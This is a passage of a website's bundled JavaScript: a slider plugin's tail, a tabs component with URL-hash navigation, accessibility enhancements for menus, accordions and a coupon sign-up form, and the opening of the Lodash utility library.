g.find(".lslide").length},s.goToSlide=function(e){v=l.loop?e+s.find(".clone.left").length-1:e,s.mode(!1),!0===l.gallery&&n.slideThumb()},s.destroy=function(){s.lightSlider&&(s.goToPrevSlide=function(){},s.goToNextSlide=function(){},s.mode=function(){},s.play=function(){},s.pause=function(){},s.refresh=function(){},s.getCurrentSlideCount=function(){},s.getTotalSlideCount=function(){},s.goToSlide=function(){},s.lightSlider=null,w={init:function(){}},s.parent().parent().find(".lSAction, .lSPager").remove(),s.removeClass("lightSlider lSFade lSSlide lsGrab lsGrabbing leftEnd right").removeAttr("style").unwrap().unwrap(),s.children().removeAttr("style"),o.removeClass("lslide active"),s.find(".clone").remove(),o=null,T=null,f=!1,v=0)},setTimeout(function(){l.onSliderLoad.call(this,s)},10),e(window).on("resize orientationchange",function(e){setTimeout(function(){e.preventDefault?e.preventDefault():e.returnValue=!1,w.init()},200)}),this}}(Cog.jQuery());
/**
 * Tabs component - desktop/js-component/component.tabs.js
 */

 (function($) {
	"use strict";

	var api = {
		tabs: []
	};

	function Tab($scope) {
		this.$scope = $scope;
		this.init();
		this.bindEvents();
	}

	Tab.prototype.init = function() {
		var $this = this.$scope;
		this.$contents = $this.find(".tabs-content");
		this.$contents.addClass("is-hidden");
		this.isVertical = $this.hasClass("tabs-vertical");
	};

	Tab.prototype.bindEvents = function() {

		function activateTab(event) {
			var $tab = $(event.currentTarget);
			var $panels = self.$contents;
			var $panel = $panels.filter($tab.find("a").attr("href"));
			var isMobile = $tab.parents(".mobile-tabs").length > 0;
			
			if (isMobile) {
				if ($tab.hasClass("is-active")) {
					$tab.removeClass("is-active");
					$panel.addClass("is-hidden");
					return;
				}
			}
			else {
				$tabs.removeClass("is-active");
				$panels.addClass("is-hidden");
			}

			$tab.addClass("is-active");
			$panel.removeClass("is-hidden");
			event.preventDefault();

			Cog.fireEvent("tab", "change", {
				id: $panel.attr("id"),
				container: $panel
			});
		}

		var $tabs = this.$scope.find(".tabs-nav-item"),
			self = this;

		this.navWidth = this.$scope.find(".tabs-nav").width();
		this.listWidth = 0;
		this.listHeight = 0;
		$tabs.each(function() {
			self.listWidth += $(this).outerWidth(true);
			self.listHeight += $(this).outerHeight(true);
		});

		if (!this.isVertical) {
			if (this.navWidth < this.listWidth) {
				this.initializeScrolling();
			}
		} else {
			this.setContentHeight();
		}

		$tabs.on("click", activateTab);

		self.$contents.filter($tabs.filter(".is-active").find("a").attr("href")).removeClass("is-hidden");
	};

	Tab.prototype.initializeScrolling = function() {

		var $switchers = this.$scope.find(".tabs-nav-switcher"),
			$switcherRight = $switchers.filter(".tabs-nav-switcher-right"),
			$switcherLeft = $switchers.filter(".tabs-nav-switcher-left"),
			$list = this.$scope.find(".tabs-nav-list"),
			self = this;

		$switcherRight.removeClass("is-hidden");
		$switchers.on("click", function() {
			var $this = $(this),
				difference = $this.hasClass("tabs-nav-switcher-right") ? -20 : 20,
				nextLeft = (parseInt($list.css("left"), 10) + difference);
			if (nextLeft < 0) {
				$switcherLeft.removeClass("is-hidden");
				if (-1 * nextLeft >= self.listWidth - self.navWidth) {
					$switcherRight.addClass("is-hidden");
				} else {
					$switcherRight.removeClass("is-hidden");
				}
			} else {
				$switcherLeft.addClass("is-hidden");
			}
			$list.stop().animate({left: nextLeft + "px"});
		});
	};

	Tab.prototype.setContentHeight = function() {
		var self = this;
		this.$contents.each(function() {
			if ($(this).height() < self.listHeight) {
				$(this).css("min-height", self.listHeight + "px");
			}
		});
	};

	api.onRegister = function(scope) {
		api.tabs.push(new Tab(scope.$scope));
	};

	Cog.registerComponent({
		name: "tabs",
		api: api,
		selector: ".tabs"
	});

	//GSKWWW-15777
	$(document).ready(function() {
		const URLHash = window.location.hash
		//sanatize URL hastag
		const URLHashText = decodeURIComponent(URLHash.replace('#', ''))
		const allTabs = document.querySelectorAll('.tabs-nav-list li.tabs-nav-item span.text-wrapper')
		allTabs.forEach((element, index)=>{
			const tabText = element.innerText
			//sanatize the text
			const text = tabText.replace(' ', '-')
			console.log(text)

			const divId = element.closest('a').getAttribute('href')
			//perform click when text matches
			if(URLHashText === text){
				//element.click()
				element.closest("li.tabs-nav-item").classList.add('is-active')
				document.querySelector(divId).classList.remove('is-hidden')	
				//scroll to that section
				$(window).scrollTop($("*:contains("+tabText+"):last").offset().top);
				// var yOffset = $(divId).offset().top;
    			// $("body").scrollTop(yOffset);
			}
			else{
				element.closest("li.tabs-nav-item").classList.remove('is-active')
				document.querySelector(divId).classList.add('is-hidden')
				//scroll to that section
				//$(window).scrollTop($("*:contains("+tabText+"):last").offset().top);
				// var yOffset = $(divId).offset().top;
    			// $("body").scrollTop(yOffset);
			}
		})

		//for test-del-dolor page
		if(URLHashText === 'niño'){
			document.querySelector("#genero .kid").click()
		}
		else if(URLHashText === 'mujer'){
			document.querySelector("#genero .mujer").click()
		}
		else if(URLHashText === 'hombre'){
			document.querySelector("#genero .hombre").click()
		}
		else{
			return;
		}
	  });
 

	// Custom Accessibility JS

	$(document).ready(function () {

	  //country selector

	  $(".select-country").attr("role", "button");
	  $(".select-country").attr("aria-haspopup", "true");
	  $(".select-country").attr("aria-expanded", "false");
	  $(".reference-language-list").hide();

	  $('.language-selector > .component-content').on('keydown', function (e) {
		if (/^(13|32)$/.test(e.which)) {
		  e.preventDefault();
		  $(this).find('.select-country').click();
		  $(".reference-language-list").show();
		  $(".megamenu-navigation .megamenu-language-list .reference-language-block a").first().focus();
		}
	  });

	  $(".language-selector > .component-content .select-country").click(function () {
		$(".reference-language-list").show();
		$(this).attr('aria-expanded', function (index, attr) {
		  return attr == 'true' ? 'false' : 'true'
		});
	  });

	  $(".select-country").attr("id", "selectCountry");
	  $(".select-country").append('<label for="selectCountry" class="visually-hidden">Select Country</label>');
  	  $(".reference-language-list").attr("id", "languageList");
	  $(".select-country").attr("aria-controls", "languageList");
	  $('<label class="visually-hidden" for="advil-family">This will automatically taken to you on another website without being able to submit your choice.</label>').insertBefore(".megamenu select#advil-family");


	  $('.searchBox form').attr('role', 'search');
	  $(".searchBox form button").append('<span class="visually-hidden">Search Button</span>');
	  $('#header').wrapAll('<header></header>');
	  $('.megamenu-navigation .navigation.megamenu-main-nav').wrapAll('<nav></nav>');
	  $('.megamenu-navigation nav').attr('role', 'navigation')
	  $('#content').wrapAll('<main></main>');
	  $('#footer').wrapAll('<footer></footer>');
	  $('.searchbox-results .search-query').attr('aria-label', 'Search again');
	  $(".icon-GSK-logo").append('<label class="visually-hidden">GSK Logo</label>');

	  setTimeout(function () {
		$('body a').removeAttr('tabindex');
		$('div').removeAttr('tabindex');
		$('select').removeAttr('tabindex');
		$('button').removeAttr('tabindex');
		$('input').removeAttr('tabindex');
		$('.hero-banner-carousel .image img').removeAttr('title');
	  	$(".select-country").attr("tabindex", "0");
		$("select").attr("tabindex", "0");
		$(".ps-location > div > span.ps-map-location-button").attr("tabindex","0");
		$('body .ps-widget[ps-sku]').attr('href', "#");
		$('body .ps-widget[ps-sku]').removeAttr('aria-label');
		$('body .ps-widget[ps-sku]').append('<span class="visually-hidden">Find where to buy this product</span>');
		var gettext = $(".country-selected").text();
      	$(".select-country").attr("aria-label", "Selected Language:" +  gettext);
	}, 3000);

	setTimeout(function () {
		$('.ps-local-seller-button').removeAttr('aria-label');
	}, 6000);

	  //close on escape key
	  $(document).keydown(function (event) {
		if (event.keyCode == 27) {
			$('body .megamenu-navigation .megamenu-submenu-items-container .megamenu-submenu-item').removeClass('opened');
			$('.reference-language-selector').removeClass('opened');
			$('.reference-language-list').removeClass('opened');
			$('.ps-store-hours').removeClass('open');
			$('.reference-language-list').addClass('hide');
			$('.reference-language-list').hide();
			$(".select-country").attr("aria-expanded", "false");
		
			setTimeout(function () {
				$('.reference-language-list').removeClass('hide');
			}, 3000);
		}
	});

	  //exit notification close on escape key
	
	  $(document).keydown(function (event) {
		if (event.keyCode == 27) {
		  $('#exit-notification').addClass('is-hidden').attr("aria-hidden", "true");
		  $('.reference-language-selector').removeClass('opened');
		  $('.megamenu-submenu-item').removeClass('opened');
		}
	  });
	  

	  //mobile navigation
	  $(".navigation .navigation-mobile-menu").attr("aria-label","Menu");
	  $(".navigation .navigation-mobile-menu").click(function () {
		$(this).attr('aria-expanded', function (index, attr) {
		  return attr == 'true' ? 'false' : 'true'
		});
	  });
	  
	 //Accordion
	  
	 //OnFocus
	 
	$(".accordion-container .accordion-slide .accordion-head a").on('focus', function () {
		$(this).closest(".accordion-head").parent(".accordion-slide").siblings().find("a").attr('aria-expanded', 'false');	
		$(this).attr('aria-expanded', function (index, attr) {
			return attr == 'true' ? 'false' : 'true'
			});
	
			var togghref = $("a", this).attr('href');
			if(togghref){
				var toggacchrefnew = togghref.replace(/#/, "")
				$(this).attr("aria-controls", toggacchrefnew);
			}
	});

	 //OnClcik

	 $(".accordion .accordion-container .accordion-slide.is-active a").attr("aria-expanded", "true");
	 $(".accordion-container .accordion-slide .accordion-head").click(function () {
		$(this).parent().siblings().find("a").attr('aria-expanded', 'false');	
		  $(this).find("a").attr('aria-expanded', function (index, attr) {
			  return attr == 'true' ? 'false' : 'true'
			});
	  
			var togghref = $("a", this).attr('href');
			if(togghref){
			var toggacchrefnew = togghref.replace(/#/, "")
			$(this).find("a").attr("aria-controls", toggacchrefnew);
			}
	  });

	  $(".accordion .accordion-container .accordion-slide .accordion-head").click(function () {
		$(this).parent(".accordion-slide").siblings().find(".accordion-content-wrapper").attr('aria-hidden', 'true');
		$(this).parent(".accordion-slide").siblings().find(".accordion-head").removeClass("active");
		$(this).toggleClass("active");
		$(this).parent(".accordion-slide").find(".accordion-content-wrapper").attr('aria-hidden', function (index, attr) {
			return attr == 'false' ? 'true' : 'false'
		});
	});


	//Tabs

	$(".tabs .tabs-nav-list .tabs-nav-item").removeAttr("role");
	$(".tabs .tabs-nav-list .tabs-nav-item.is-active a").attr("aria-selected", true);
        $(".tabs .tabs-nav-list .tabs-nav-item").on("click", function () {
            $(this).find("a").attr("aria-selected", true);
            $(this).siblings().find("a").attr("aria-selected", false);

            var href = $("a", this).attr('href');
            var hrefnew = href.replace(/#/, "")
			if(hrefnew){
           	 $(this).find("a").attr("aria-controls", hrefnew);
			}
        });

	//pagination

	var pagItemsNode = document.querySelectorAll('.searchResults-pagination-list');
	if (pagItemsNode.length) {
		$(pagItemsNode).wrapAll('<nav></nav>');
		$(".searchResults-pagination-list").parent().attr("role", "navigation");
		$(".searchResults-pagination-list").parent().attr('aria-label', 'Search results pages');
		$(".searchResults-pagination-item.item-previous").append('<span class="visually-hidden">Previous</span>');
		$(".searchResults-pagination-item.item-next").append('<span class="visually-hidden">Next</span>');
	}

	var pagListNode = document.querySelectorAll('.searchResults-pagination ul li');
	if (pagListNode.length) {
		if ($(pagListNode).hasClass('is-active')) {
			$(".searchResults-pagination ul li.is-active a").attr("aria-current", "true");
		}
	}

	var pagItems = document.querySelectorAll('.searchResults-pagination li a:not(.searchResults-pagination-item.item-next a , .searchResults-pagination-item.item-previous a)');
	let i;
	for (i = 0; i < pagItems.length; i++) {
		var counter = i + 1;
		var string = "Page " + counter;

		if (pagItems[i].getAttribute('aria-current')) {
			string = "Page " + counter + ", Current Page";
		}

		pagItems[i].setAttribute('aria-label', string);
	}

	
	setTimeout(function () {

		$('.gigya-screen .gigya-composite-control.gigya-composite-control-checkbox .gigya-input-checkbox').on('keydown', function (e) {
			if (/^(13|32)$/.test(e.which)) {
				e.preventDefault();
				$(this).click();
			}
		});

		$(".gigya-screen .gigya-composite-control.gigya-composite-control-textbox input[name='data.ds.advil.coupons.firstName']").attr('autocomplete', 'First Name');
		$(".gigya-screen .gigya-composite-control.gigya-composite-control-textbox input[name='data.ds.advil.coupons.lastName']").attr('autocomplete', 'Last Name');
		$(".gigya-screen .gigya-composite-control.gigya-composite-control-textbox input[name='profile.email']").attr('autocomplete', 'Email');
		$(".gigya-screen .gigya-composite-control.gigya-composite-control-textbox input[name='data.ds.advil.coupons.dateOfBirth']").attr('autocomplete', 'Date of Birth');
		$(".gigya-screen .gigya-composite-control.gigya-composite-control-textbox input[name='data.ds.advil.coupons.zipCode']").attr('autocomplete', 'Zipcode');

		$('.gigyaraas .gigya-composite-control.gigya-composite-control-submit .gigya-input-submit').click(function () {
			setTimeout(function () {
				$(".gigya-subscribe-with-email-form").find(".gigya-composite-control.gigya-composite-control-textbox input.gigya-error").first().focus();
			}, 500);
		});
	}, 4000);

	//delay flyout 0.5s

	$(".megamenu-navigation .megamenu-main-nav .component-content .navigation-root.navigation-level1 .navigation-item").hover(
		function() {
		  $(this).addClass("current");
		  var hoverType = $(this).find('> a').attr('title');
		  var str = 'body .megamenu-navigation .megamenu-submenu-items-container .megamenu-submenu-item[data-link-title= "' + hoverType + '"]';
		  $(str).addClass("openedNew");
		},
		function() {
		  setTimeout(function() {
			$(this).removeClass("current");
			var hoverType = $(this).find('> a').attr('title');
			var str = 'body .megamenu-navigation .megamenu-submenu-items-container .megamenu-submenu-item[data-link-title= "' + hoverType + '"]';
			$(str).removeClass('openedNew');
		  }.bind(this), 500)
		});

		//end


	//Megamenu

	$(".megamenu-submenu-item.content-products").attr("data-link-title", "Products");
	$(".megamenu-submenu-item.content-safety").attr("data-link-title", "Safety");
	$(".megamenu-submenu-item.content-tips-and-resources").attr("data-link-title", "Tips and Resources");
	$(".megamenu-submenu-item.content-advil-story").attr("data-link-title", "Advil Story");

	if ($(window).width() > 992) {
		var filteredContent = $('body .megamenu-navigation .megamenu-submenu-items-container .megamenu-submenu-item');
		$('.megamenu-navigation .megamenu-main-nav .component-content .navigation-root.navigation-level1 .navigation-item .navigation-item-title').on('focus', function () {
			var isFocused = $(this).is(":focus");
			if (isFocused) {
				$('.megamenu-navigation .megamenu-main-nav .component-content .navigation-root.navigation-level1 .navigation-item').removeClass('is-active');
				$(this).parent().addClass('is-active');
				var dataType = $(this).attr('title');
				console.log(dataType);
				var str = 'body .megamenu-navigation .megamenu-submenu-items-container .megamenu-submenu-item[data-link-title= "' + dataType + '"]';
				setTimeout(function () {
				   filteredContent.removeClass('opened');
                   $(str).addClass("opened");
				   $(str).find(".navigation-root.navigation-branch.navigation-level1>li > a[title]").focus();
                }, 500);
			}
		});
	}

	$(document).on("keydown", ".megamenu-submenu-items-container .megamenu-submenu-item", function (d) {
		var b = d.keyCode || d.which;
		var c = $(this).attr("title");
		if ($(window).width() > 992) {
			if (b === 9) {
				if ($(this).find(".last.component h4").find("a").is(":focus")) {
					$("body .megamenu-navigation .megamenu-main-nav>.component-content>.navigation-root.navigation-level1>.navigation-item.is-active>a").parent("li").next().find("a").focus();
					$(this).removeClass("opened");
					$(this).find(".navigation-root.navigation-branch.navigation-level1>li > a[title]").focus();
					return false;
				}
			}
			if (d.shiftKey && d.keyCode == 9) {
				if ($(this).find(".navigation-root.navigation-branch.navigation-level1>li > a[title]").is(":focus")) {
					$('body .megamenu-navigation .megamenu-main-nav>.component-content>.navigation-root.navigation-level1>.navigation-item > a[title="' + c + '"]').focus();

				}
			} else {
				if (d.shiftKey && d.keyCode == 9) {
					if ($(this).find(".navigation-root.navigation-branch.navigation-level1>li > a[title]").is(":focus")) {
						//empty
					}
				}
			}
		}
	});


	});

})(Cog.jQuery());



// ----------firstTags_open------------------------
window.addEventListener("load", () => {
	const opentagfirst= document.querySelectorAll('.tabs-content.is-hidden').length;
	if(opentagfirst>0){
	let firstTagOpen = document.querySelectorAll('.tabs-content.is-hidden')[0];
firstTagOpen.classList.remove('is-hidden');
}
  });
/**
 * @license
 * Lodash version 4.17.21
 * Lodash <https://lodash.com/>
 * Copyright OpenJS Foundation and other contributors <https://openjsf.org/>
 * Released under MIT license <https://lodash.com/license>
 * Based on Underscore.js 1.8.3 <http://underscorejs.org/LICENSE>
 * Copyright Jeremy Ashkenas, DocumentCloud and Investigative Reporters & Editors
 */
 (function () {
  function n(n, t, r) {
    switch (r.length) {
      case 0:
        return n.call(t);
      case 1:
        return n.call(t, r[0]);
      case 2:
        return n.call(t, r[0], r[1]);
      case 3:
        return n.call(t, r[0], r[1], r[2]);
    }
    return n.apply(t, r);
  }
  function t(n, t, r, e) {
    for (var u = -1, i = null == n ? 0 : n.length; ++u < i; ) {
      var o = n[u];
      t(e, o, r(o), n);
    }
    return e;
  }
  function r(n, t) {
    for (
      var r = -1, e = null == n ? 0 : n.length;
      ++r < e && t(n[r], r, n) !== !1;

    );
    return n;
  }
  function e(n, t) {
    for (var r = null == n ? 0 : n.length; r-- && t(n[r], r, n) !== !1; );
    return n;
  }
  function u(n, t) {
    for (var r = -1, e = null == n ? 0 : n.length; ++r < e; )
      if (!t(n[r], r, n)) return !1;
    return !0;
  }
  function i(n, t) {
    for (var r = -1, e = null == n ? 0 : n.length, u = 0, i = []; ++r < e; ) {
      var o = n[r];
      t(o, r, n) && (i[u++] = o);
    }
    return i;
  }
  function o(n, t) {
    return !!(null == n ? 0 : n.length) && y(n, t, 0) > -1;
  }
  function f(n, t, r) {
    for (var e = -1, u = null == n ? 0 : n.length; ++e < u; )
      if (r(t, n[e])) return !0;
    return !1;
  }
  function c(n, t) {
    for (var r = -1, e = null == n ? 0 : n.length, u = Array(e); ++r < e; )
      u[r] = t(n[r], r, n);
    return u;
  }
  function a(n, t) {
    for (var r = -1, e = t.length, u = n.length; ++r < e; ) n[u + r] = t[r];
    return n;
  }
  function l(n, t, r, e) {
    var u = -1,
      i = null == n ? 0 : n.length;
    for (e && i && (r = n[++u]); ++u < i; ) r = t(r, n[u], u, n);
    return r;
  }
  function s(n, t, r, e) {
    var u = null == n ? 0 : n.length;
    for (e && u && (r = n[--u]); u--; ) r = t(r, n[u], u, n);
    return r;
  }
  function h(n, t) {
    for (var r = -1, e = null == n ? 0 : n.length; ++r < e; )
      if (t(n[r], r, n)) return !0;
    return !1;
  }
  function p(n) {
    return n.split("");
  }
  function _(n) {
    return n.match($t) || [];
  }
  function v(n, t, r) {
    var e;
    return (
      r(n, function (n, r, u) {
        if (t(n, r, u)) return (e = r), !1;
      }),
      e
    );
  }
  function g(n, t, r, e) {
    for (var u = n.length, i = r + (e ? 1 : -1); e ? i-- : ++i < u; )
      if (t(n[i], i, n)) return i;
    return -1;
  }
  function y(n, t, r) {
    return t === t ? Z(n, t, r) : g(n, b, r);
  }
  function d(n, t, r, e) {
    for (var u = r - 1, i = n.length; ++u < i; ) if (e(n[u], t)) return u;
    return -1;
  }
  function b(n) {
    return n !== n;
  }
  function w(n, t) {
    var r = null == n ? 0 : n.length;
    return r ? k(n, t) / r : Cn;
  }
  function m(n) {
    return function (t) {
      return null == t ? X : t[n];
    };
  }
  function x(n) {
    return function (t) {
      return null == n ? X : n[t];
    };
  }
  function j(n, t, r, e, u) {
    return (
      u(n, function (n, u, i) {
        r = e ? ((e = !1), n) : t(r, n, u, i);
      }),
      r
    );
  }
  function A(n, t) {
    var r = n.length;
    for (n.sort(t); r--; ) n[r] = n[r].value;
    return n;
  }
  function k(n, t) {
    for (var r, e = -1, u = n.length; ++e < u; ) {
      var i = t(n[e]);
      i !== X && (r = r === X ? i : r + i);
    }
    return r;
  }
  function O(n, t) {
    for (var r = -1, e = Array(n); ++r < n; ) e[r] = t(r);
    return e;
  }
  function I(n, t) {
    return c(t, function (t) {
      return [t, n[t]];
    });
  }
  function R(n) {
    return n ? n.slice(0, H(n) + 1).replace(Lt, "") : n;
  }
  function z(n) {
    return function (t) {
      return n(t);
    };
  }
  function E(n, t) {
    return c(t, function (t) {
      return n[t];
    });
  }
  function S(n, t) {
    return n.has(t);
  }
  function W(n, t) {
    for (var r = -1, e = n.length; ++r < e && y(t, n[r], 0) > -1; );
    return r;
  }
  function L(n, t) {
    for (var r = n.length; r-- && y(t, n[r], 0) > -1; );
    return r;
  }
  function C(n, t) {
    for (var r = n.length, e = 0; r--; ) n[r] === t && ++e;
    return e;
  }
  function U(n) {
    return "\\" + Yr[n];
  }
  function B(n, t) {
    return null == n ? X : n[t];
  }
  function T(n) {
    return Nr.test(n);
  }
  function $(n) {
    return Pr.test(n);
  }
  function D(n) {
    for (var t, r = []; !(t = n.next()).done; ) r.push(t.value);
    return r;
  }
  function M(n) {
    var t = -1,
      r = Array(n.size);
    return (
      n.forEach(function (n, e) {
        r[++t] = [e, n];
      }),
      r
    );
  }
  function F(n, t) {
    return function (r) {
      return n(t(r));
    };
  }
  function N(n, t) {
    for (var r = -1, e = n.length, u = 0, i = []; ++r < e; ) {
      var o = n[r];
      (o !== t && o !== cn) || ((n[r] = cn), (i[u++] = r));
    }
    return i;
  }
  function P(n) {
    var t = -1,
      r = Array(n.size);
    return (
      n.forEach(function (n) {
        r[++t] = n;
      }),
      r
    );
  }
  function q(n) {
    var t = -1,
      r = Array(n.size);
    return (
      n.forEach(function (n) {
        r[++t] = [n, n];
      }),
      r
    );
  }
  function Z(n, t, r) {
    for (var e = r - 1, u = n.length; ++e < u; ) if (n[e] === t) return e;
    return -1;
  }
  function K(n, t, r) {
    for (var e = r + 1; e--; ) if (n[e] === t) return e;
    return e;
  }
  function V(n) {
    return T(n) ? J(n) : _e(n);
  }
  function G(n) {
    return T(n) ? Y(n) : p(n);
  }
  function H(n) {
    for (var t = n.length; t-- && Ct.test(n.charAt(t)); );
    return t;
  }
  function J(n) {
    for (var t = (Mr.lastIndex = 0); Mr.test(n); ) ++t;
    return t;
  }
  function Y(n) {
    return n.match(Mr) || [];
  }
  function Q(n) {
    return n.match(Fr) || [];
  }
  var X,
    nn = "4.17.21",
    tn = 200,
    rn = "Unsupported core-js use. Try https://npms.io/search?q=ponyfill.",
    en = "Expected a function",
    un = "Invalid `variable` option passed into `_.template`",
    on = "__lodash_hash_undefined__",
    fn = 500,
    cn = "__lodash_placeholder__",
    an = 1,
    ln = 2,
    sn = 4,
    hn = 1,
    pn = 2,
    _n = 1,
    vn = 2,
    gn = 4,
    yn = 8,
    dn = 16,
    bn = 32,
    wn = 64,
    mn = 128,
    xn = 256,
    jn = 512,
    An = 30,
    kn = "...",
    On = 800,
    In = 16,
    Rn = 1,
    zn = 2,
    En = 3,
    Sn = 1 / 0,
    Wn = 9007199254740991,
    Ln = 1.7976931348623157e308,
    Cn = NaN,
    Un = 4294967295,
    Bn = Un - 1,
    Tn = Un >>> 1,
    $n = [
      ["ary", mn],
      ["bind", _n],
      ["bindKey", vn],
      ["curry", yn],
      ["curryRight", dn],
      ["flip", jn],
      ["partial", bn],
      ["partialRight", wn],
      ["rearg", xn],
    ],
    Dn = "[object Arguments]",
    Mn = "[object Array]",
    Fn = "[object AsyncFunction]",
    Nn = "[object Boolean]",
    Pn = "[object Date]",
    qn = "[object DOMException]",
    Zn = "[object Error]",
    Kn = "[object Function]",
    Vn = "[object GeneratorFunction]",
    Gn = "[object Map]",
    Hn = "[object Number]",
    Jn = "[object Null]",
    Yn = "[object Object]",
    Qn = "[object Promise]",
    Xn = "[object Proxy]",
    nt = "[object RegExp]",
    tt = "[object Set]",
    rt = "[object String]",
    et = "[object Symbol]",
    ut = "[object Undefined]",
    it = "[object WeakMap]",
    ot = "[object WeakSet]",
    ft = "[object ArrayBuffer]",
    ct = "[object DataView]",
    at = "[object Float32Array]",
    lt = "[object Float64Array]",
    st = "[object Int8Array]",
    ht = "[object Int16Array]",
    pt = "[object Int32Array]",
    _t = "[object Uint8Array]",
    vt = "[object Uint8ClampedArray]",
    gt = "[object Uint16Array]",
    yt = "[object Uint32Array]",
    dt = /\b__p \+= '';/g,
    bt = /\b(__p \+=) '' \+/g,
    wt = /(__e\(.*?\)|\b__t\)) \+\n'';/g,
    mt = /&(?:amp|lt|gt|quot|#39);/g,
    xt = /[&<>"']/g,
    jt = RegExp(mt.source),
    At = RegExp(xt.source),
    kt = /<%-([\s\S]+?)%>/g,
    Ot = /<%([\s\S]+?)%>/g,
    It = /<%=([\s\S]+?)%>/g,
    Rt = /\.|\[(?:[^[\]]*|(["'])(?:(?!\1)[^\\]|\\.)*?\1)\]/,
    zt = /^\w*$/,
    Et =
      /[^.[\]]+|\[(?:(-?\d+(?:\.\d+)?)|(["'])((?:(?!\2)[^\\]|\\.)*?)\2)\]|(?=(?:\.|\[\])(?:\.|\[\]|$))/g,
    St = /[\\^$.*+?()[\]{}|]/g,
    Wt = RegExp(St.source),
    Lt = /^\s+/,
    Ct = /\s/,
    Ut = /\{(?:\n\/\* \[wrapped with .+\] \*\/)?\n?/,
    Bt = /\{\n\/\* \[wrapped with (.+)\] \*/,
    Tt = /,? & /,
    $t = /[^\x00-\x2f\x3a-\x40\x5b-\x60\x7b-\x7f]+/g,
    Dt = /[()=,{}\[\]\/\s]/,
    Mt = /\\(\\)?/g,
    Ft = /\$\{([^\\}]*(?:\\.[^\\}]*)*)\}/g,
    Nt = /\w*$/,
    Pt = /^[-+]0x[0-9a-f]+$/i,
    qt = /^0b[01]+$/i,
    Zt = /^\[object .+?Constructor\]$/,
    Kt = /^0o[0-7]+$/i,
    Vt = /^(?:0|[1-9]\d*)$/,
    Gt = /[\xc0-\xd6\xd8-\xf6\xf8-\xff\u0100-\u017f]/g,
    Ht = /($^)/,
    Jt = /['\n\r\u2028\u2029\\]/g,
    Yt = "\\ud800-\\udfff",
    Qt = "\\u0300-\\u036f",
    Xt = "\\ufe20-\\ufe2f",
    nr = "\\u20d0-\\u20ff",
    tr = Qt + Xt + nr,
    rr = "\\u2700-\\u27bf",
    er = "a-z\\xdf-\\xf6\\xf8-\\xff",
    ur = "\\xac\\xb1\\xd7\\xf7",
    ir = "\\x00-\\x2f\\x3a-\\x40\\x5b-\\x60\\x7b-\\xbf",
    or = "\\u2000-\\u206f",
    fr =
      " \\t\\x0b\\f\\xa0\\ufeff\\n\\r\\u2028\\u2029\\u1680\\u180e\\u2000\\u2001\\u2002\\u2003\\u2004\\u2005\\u2006\\u2007\\u2008\\u2009\\u200a\\u202f\\u205f\\u3000",
    cr = "A-Z\\xc0-\\xd6\\xd8-\\xde",
    ar = "\\ufe0e\\ufe0f",
    lr = ur + ir + or + fr,
    sr = "['\u2019]",
    hr = "[" + Yt + "]",
    pr = "[" + lr + "]",
    _r = "[" + tr + "]",
    vr = "\\d+",
    gr = "[" + rr + "]",
    yr = "[" + er + "]",
    dr = "[^" + Yt + lr + vr + rr + er + cr + "]",
    br = "\\ud83c[\\udffb-\\udfff]",
    wr = "(?:" + _r + "|" + br + ")",
    mr = "[^" + Yt + "]",
    xr = "(?:\\ud83c[\\udde6-\\uddff]){2}",
    jr = "[\\ud800-\\udbff][\\udc00-\\udfff]",
    Ar = "[" + cr + "]",
    kr = "\\u200d",
    Or = "(?:" + yr + "|" + dr + ")",
    Ir = "(?:" + Ar + "|" + dr + ")",
    Rr = "(?:" + sr + "(?:d|ll|m|re|s|t|ve))?",
    zr = "(?:" + sr + "(?:D|LL|M|RE|S|T|VE))?",
    Er = wr + "?",
    Sr = "[" + ar + "]?",
    Wr = "(?:" + kr + "(?:" + [mr, xr, jr].join("|") + ")" + Sr + Er + ")*",
    Lr = "\\d*(?:1st|2nd|3rd|(?![123])\\dth)(?=\\b|[A-Z_])",
    Cr = "\\d*(?:1ST|2ND|3RD|(?![123])\\dTH)(?=\\b|[a-z_])",
    Ur = Sr + Er + Wr,
    Br = "(?:" + [gr, xr, jr].join("|") + ")" + Ur,
    Tr = "(?:" + [mr + _r + "?", _r, xr, jr, hr].join("|") + ")",
    $r = RegExp(sr, "g"),
    Dr = RegExp(_r, "g"),
    Mr = RegExp(br + "(?=" + br + ")|" + Tr + Ur, "g"),
    Fr = RegExp(
      [
        Ar + "?" + yr + "+" + Rr + "(?=" + [pr, Ar, "$"].join("|") + ")",
        Ir + "+" + zr + "(?=" + [pr, Ar + Or, "$"].join("|") + ")",
        Ar + "?" + Or + "+" + Rr,
        Ar + "+" + zr,
        Cr,
        Lr,
        vr,
        Br,
      ].join("|"),
      "g"
    ),
    Nr = RegExp("[" + kr + Yt + tr + ar + "]"),
    Pr = /[a-z][A-Z]|[A-Z]{2}[a-z]|[0-9][a-zA-Z]|[a-zA-Z][0-9]|[^a-zA-Z0-9 ]/,
    qr = [
      "Array",
      "Buffer",
      "DataView",
      "Date",
      "Error",
      "Float32Array",
      "Float64Array",
      "Function",
      "Int8Array",
      "Int16Array",
      "Int32Array",
      "Map",
      "Math",
      "Object",
      "Promise",
      "RegExp",
      "Set",
      "String",
      "Symbol",
      "TypeError",
      "Uint8Array",
      "Uint8ClampedArray",
      "Uint16Array",
      "Uint32Array",
      "WeakMap",
      "_",
      "clearTimeout",
      "isFinite",
      "parseInt",
      "setTimeout",
    ],
    Zr = -1,
    Kr = {};
  (Kr[at] =
    Kr[lt] =
    Kr[st] =
    Kr[ht] =
    Kr[pt] =
    Kr[_t] =
    Kr[vt] =
    Kr[gt] =
    Kr[yt] =
      !0),
    (Kr[Dn] =
      Kr[Mn] =
      Kr[ft] =
      Kr[Nn] =
      Kr[ct] =
      Kr[Pn] =
      Kr[Zn] =
      Kr[Kn] =
      Kr[Gn] =
      Kr[Hn] =
      Kr[Yn] =
      Kr[nt] =
      Kr[tt] =
      Kr[rt] =
      Kr[it] =
        !1);
  var Vr = {};
  (Vr[Dn] =
    Vr[Mn] =
    Vr[ft] =
    Vr[ct] =
    Vr[Nn] =
    Vr[Pn] =
    Vr[at] =
    Vr[lt] =
    Vr[st] =
    Vr[ht] =
    Vr[pt] =
    Vr[Gn] =
    Vr[Hn] =
    Vr[Yn] =
    Vr[nt] =
    Vr[tt] =
    Vr[rt] =
    Vr[et] =
    Vr[_t] =
    Vr[vt] =
    Vr[gt] =
    Vr[yt] =
      !0),
    (Vr[Zn] = Vr[Kn] = Vr[it] = !1);
  var Gr = {
      "\xc0": "A",
      "\xc1": "A",
      "\xc2": "A",
      "\xc3": "A",
      "\xc4": "A",
      "\xc5": "A",
      "\xe0": "a",
